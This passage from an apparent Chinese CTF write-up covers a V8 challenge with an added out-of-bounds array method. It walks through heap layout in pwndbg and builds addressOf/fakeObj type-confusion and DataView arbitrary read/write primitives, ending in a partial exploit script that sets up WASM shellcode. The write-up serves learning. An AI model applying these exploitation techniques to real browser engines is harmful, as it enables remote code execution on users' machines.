Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>嗯。。。。。。，好像看的不太懂，这里简单解释一下<br>这里主要是出题人为 <code>array</code> 定义了一个 <code>oob</code> 函数，其函数的功能如下：  </p><ul><li>获取参数的数量，然后根据参数个数进行不同的操作  </li><li>如果参数数量大于 <code>2</code> 则直接抛出 <code>undefined</code>  </li><li>如果参数数量小于等于 <code>2</code>，则先把 <code>array</code> 转成 <code>doublearray</code>  </li><li>然后判断如果无额外参数（第一个是 <code>this</code>），则是 <code>read</code> 功能，返回 <code>array[length]</code>  </li><li>如果传入了一个参数，则是 <code>write</code> 功能，将 <code>value</code> 写入到 <code>doublearray[length]</code> 中</li></ul><p>这里的漏洞还是挺好发现了，我们知道 <code>array</code> 最后一个元素的索引为 <code>length - 1</code>， 而这里可以索引到 <code>length</code>，也就是说我们可以在 <code>elements</code> 中越界读和写一个索引的数据<br>在上面的分析中我们知道 <code>elements</code> 是在 <code>obj</code> 的上方的，当时我也说过 <code>elements</code> 并不一定紧贴着 <code>obj</code> 的，现在我就来分析一下这个问题。<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x20bd84310ab9 &lt;JSArray[4]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x20bd84310ab9</span><br><span class="line">0x20bd84310ab9: [JSArray]</span><br><span class="line"> - map: 0x273506142d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02e1c7e51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10c0b3540c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x15d18a8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x20bd84310a41</span><br><span class="line">00:0000│  0x20bd84310a41 ◂— 0x10c0b35408</span><br><span class="line">01:0008│  0x20bd84310a49 ◂— 0x4000000</span><br><span class="line">02:0010│  0x20bd84310a51 ◂— 0x1000000</span><br><span class="line">03:0018│  0x20bd84310a59 ◂— 0x2000000</span><br><span class="line">04:0020│  0x20bd84310a61 ◂— 0x3000000</span><br><span class="line">05:0028│  0x20bd84310a69 ◂— 0x5100000004000000</span><br><span class="line">06:0030│  0x20bd84310a71 ◂— 0x10c0b35408</span><br><span class="line">07:0038│  0x20bd84310a79 ◂— 0x2900000004000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>怪，可以看见在 <code>elements</code> 到 <code>obj</code> 的中间存在一些数据，于是我好奇去看看这是什么东西  </p><img src="/2024/05/05/v8start/8.png" class="" title="我的图图呢">  <p>好家伙，居然还会存在一个别的结构。算了，这不是我这个初学者该了解的东西，等学深入了再研究吧，暂时不影响解题<br>既然全为整数的 <code>array</code> 的 <code>elements</code> 无法紧贴着 <code>obj</code>，那存在浮点数的 <code>array</code> 呢？<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>运行结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x116059b90b21 &lt;JSArray[4]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x116059b90b21</span><br><span class="line">0x116059b90b21: [JSArray]</span><br><span class="line"> - map: 0x0ce399302ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07fe97a11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3ffe4d400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x062d803001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x116059b90af1</span><br><span class="line">00:0000│  0x116059b90af1 ◂— 0x3ffe4d4014</span><br><span class="line">01:0008│  0x116059b90af9 ◂— 0x9a00000004000000</span><br><span class="line">02:0010│  0x116059b90b01 ◂— 0x9a3ff19999999999</span><br><span class="line">03:0018│  0x116059b90b09 ◂— 0x40019999999999</span><br><span class="line">04:0020│  0x116059b90b11 ◂— 0x40080000000000</span><br><span class="line">05:0028│  0x116059b90b19 ◂— 0xd940100000000000</span><br><span class="line">06:0030│  0x116059b90b21 ◂— 0x7100000ce399302e</span><br><span class="line">07:0038│  0x116059b90b29 ◂— 0xf100003ffe4d400c</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见带浮点数数组的 <code>elements</code> 是紧贴着 <code>obj</code> 的，这符合我们漏洞的利用<br>首先尝试利用一下能否利用该漏洞来泄露出 <code>obj</code> 中 <code>map</code> 的值  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="built_in">float</span> array map: 0x000029e6d51c2ed9</span><br><span class="line">0x133632fd10b1 &lt;JSArray[1]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x133632fd10b1</span><br><span class="line">0x133632fd10b1: [JSArray]</span><br><span class="line"> - map: 0x29e6d51c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1dc4905d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x097d61840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3faa656801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们已经成功的泄露出了 <code>map</code>。同理，我们也可以用类似的方法去修改 <code>map</code><br>为了能够在 <code>WASM</code> 上写入我们的 <code>shellcode</code>，我们需要任意地址写和地址泄露，这时候就需要用到类型混淆  </p><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>在上面已经说过，<code>v8</code> 是通过 <code>map</code> 所指向的区域来判断该对象是什么类型，也就是说，如果我们吧一个存储 <code>obj</code> 的 <code>array</code> 的 <code>map</code> 修改为存在浮点数数组的 <code>map</code>，这时候我们就能够直接获取到该对象的地址。我们可以将该原语封装成一个 <code>addressOf</code> 函数  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>addressOf</code> 函数的功能为获取指定对象 <code>obj</code> 的地址，建议读者仔细阅读和理解该函数的实现原理<br>同理，我们也可以用类似的思路来实现任意地址的写，不过有一点点绕  </p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>任意地址写的思想为伪造一个 <code>object</code>，根据类型混淆可以将该原语封装成一个函数：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还是希望读者可以自行思考和理解该原语是如何实现伪造 <code>object</code> 的。<br>我们伪造的 <code>object</code> 是在 <code>elements</code> 上面的，而 <code>elements</code> 上的数据是可控的，我们可以按照如下样式伪造一个存在浮点数的 <code>object</code>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(target - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>这里伪造的是一个没有原型的存在浮点数的 <code>objcet</code>，<code>target</code> 为我们想要进行写的地址，也就是伪造的 <code>elements</code><br>我们可以在泄露出 <code>float_array_mem</code> 的地址后通过 <code>fakeObj(fake_obj_addr)</code> 函数来获取我们的 <code>fake object</code>，然后向 <code>target</code> 写入数据。至于为什么 <code>target</code> 要 <code>-0x10</code> 呢，因为 <code>elements</code> 上面有 <code>0x10</code> 字节用于存储 <code>map</code> 和 <code>length</code><br>有了对象地址泄露和任意地址写，我们就以为能够在 <code>WASM</code> 上愉快的写 <code>shellcode</code> 了，可事情并没有这么简单，即在写 <code>0x7fxxxxx</code> 这样的高地址的时候会出现问题，地址的低位会被修改，导致出现访问异常。因为写原语使用的是 <code>FloatArray</code> 的写入操作，而 <code>Double</code> 类型的浮点数数组在处理 <code>7f</code> 开头的高地址时会出现将低 <code>20</code> 位与运算为 <code>0</code><br>这时候我们就要使用 <code>DataView </code>对象，该对象的结构如下：  </p><img src="/2024/05/05/v8start/9.png" class="" title="我的图图呢">  <p>这是用来读写 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 的内容的对象，在 <code>exploit</code> 里常用作最后的任意地址读写原语的构造。<br>可以看见这个 <code>DataView</code> 多了一个 <code>BackingStore</code>。<code>DataView</code> 对象中的 <code>backing_store</code> 会指向申请的 <code>data_buf</code> (<code>backing_store</code> 相当于我们的 <code>elements</code>)，修改 <code>backing_store</code> 为我们想要写的地址，并通过 <code>DataView</code> 对象的 <code>setBigUint64</code> 方法就可以往指定地址正常写入数据了。<br>那现在我们的思路就很明确了，首先申请 <code>2</code> 个 <code>ArrayBuffer</code> 对象 <code>ab1</code>、<code>ab2</code>，申请他们各自的 <code>DataView</code> 对象 <code>dv1</code>、<code>dv2</code>。将伪造的 <code>fakeobj</code> 的 <code>elements</code> 指向 <code>dv1</code> 的 <code>BackingStore-0x10</code>，再通过修改 <code>fakeobj</code> 令 <code>dv1</code> 的 <code>BackingStore</code> 指向 <code>dv2</code> 的 <code>BackingStore-0x10</code><br>此时，我们可以通过修改 <code>fakeobj</code> 来修改 <code>dv2</code> <code>BackingStore</code> 处的值，最后通过 <code>dv2</code> 的内置函数来实现任意地址的读写。提醒一下，这里要区分开 <code>BackingStore</code> 的地址和 <code>BackingStore</code> 地址出的值这2个概念。原语封装函数如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// 没有原型</span></span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, 